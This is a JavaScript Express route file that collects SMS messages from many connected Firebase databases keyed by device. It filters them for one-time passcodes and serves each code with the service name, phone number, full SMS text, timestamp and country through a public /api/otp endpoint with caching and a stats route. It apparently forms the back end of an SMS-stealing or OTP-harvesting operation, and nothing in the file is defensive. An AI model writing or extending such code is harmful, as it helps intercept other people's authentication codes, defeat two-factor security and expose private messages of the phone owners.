"use strict";

/**
 * OTP API route.
 * Public endpoint that returns OTP codes from connected Firebase databases.
 * Format matches: [service, phone, raw_sms, timestamp, country]
 */

const { Router } = require("express");
const ConnectionsService = require("../services/connections");
const FirebaseService = require("../services/firebase");
const DeviceService = require("../services/devices");
const OtpExtractor = require("../services/otpExtractor");

const router = Router();

// Cache for OTP results (avoid hammering Firebase on every request)
let _cache = { data: null, timestamp: 0 };
const CACHE_TTL_MS = 30000; // 30 seconds

/**
 * GET /api/otp
 * Fetch OTP codes from all active Firebase connections.
 *
 * Query params:
 *   count - Number of OTPs to return (default: 10, max: 100)
 *   key   - Optional API key for higher rate limits
 *   fresh - Bypass cache (1 = true)
 */
router.get("/", async (req, res, next) => {
  try {
    const count = Math.min(parseInt(req.query.count) || 10, 100);
    const fresh = req.query.fresh === "1";

    // Check cache
    if (!fresh && _cache.data && (Date.now() - _cache.timestamp) < CACHE_TTL_MS) {
      return res.json(_cache.data.slice(0, count));
    }

    // Get all active connections
    const connections = ConnectionsService.getAllActive();
    if (connections.length === 0) {
      return res.json([]);
    }

    const allOtps = [];

    // Fetch messages from all connections in parallel
    const results = await Promise.allSettled(
      connections.map(async (conn) => {
        try {
          const [clientsData, messagesRoot] = await Promise.all([
            FirebaseService.read(conn.url, conn.key, "clients").catch(() => null),
            FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
          ]);

          const devices = DeviceService.parseAll(clientsData);
          const connOtps = [];

          if (messagesRoot && typeof messagesRoot === "object") {
            for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
              if (!deviceMessages || typeof deviceMessages !== "object") continue;

              const device = devices.find((d) => d.id === deviceId) || { id: deviceId, phoneNumber: "—" };
              const phone = OtpExtractor.extractPhoneNumber(device, Object.values(deviceMessages));

              for (const [msgId, msg] of Object.entries(deviceMessages)) {
                if (!msg || typeof msg !== "object") continue;

                const text = msg.text || msg.body || msg.message || "";
                if (!OtpExtractor.isOtpMessage(text)) continue;

                const extracted = OtpExtractor.extractOtp(text);
                if (!extracted) continue;

                const timestamp = msg.timestamp || msg.time || new Date().toISOString();
                const country = OtpExtractor.detectCountry(phone);

                connOtps.push([
                  extracted.service,
                  phone || "Unknown",
                  text.trim(),
                  formatTimestamp(timestamp),
                  " " + country,
                ]);
              }
            }
          }

          return connOtps;
        } catch {
          return [];
        }
      })
    );

    // Flatten all results
    for (const result of results) {
      if (result.status === "fulfilled") {
        allOtps.push(...result.value);
      }
    }

    // Sort by timestamp (newest first)
    allOtps.sort((a, b) => {
      const dateA = new Date(a[3]).getTime() || 0;
      const dateB = new Date(b[3]).getTime() || 0;
      return dateB - dateA;
    });

    // Update cache
    _cache = { data: allOtps, timestamp: Date.now() };

    res.json(allOtps.slice(0, count));
  } catch (err) {
    next(err);
  }
});

/**
 * GET /api/otp/stats
 * Get statistics about available OTPs.
 */
router.get("/stats", async (req, res, next) => {
  try {
    const connections = ConnectionsService.getAllActive();
    const totalConnections = connections.length;

    // Use cached data if available
    const otpCount = _cache.data ? _cache.data.length : 0;
    const cacheAge = _cache.timestamp ? Math.round((Date.now() - _cache.timestamp) / 1000) : -1;

    res.json({
      activeConnections: totalConnections,
      cachedOtps: otpCount,
      cacheAgeSeconds: cacheAge,
      cacheTtlSeconds: CACHE_TTL_MS / 1000,
    });
  } catch (err) {
    next(err);
  }
});

function formatTimestamp(ts) {
  if (!ts) return new Date().toISOString().replace("T", " ").slice(0, 19);
  const d = typeof ts === "number" ? new Date(ts) : new Date(ts);
  if (isNaN(d.getTime())) return String(ts);
  return d.toISOString().replace("T", " ").slice(0, 19);
}

module.exports = router;
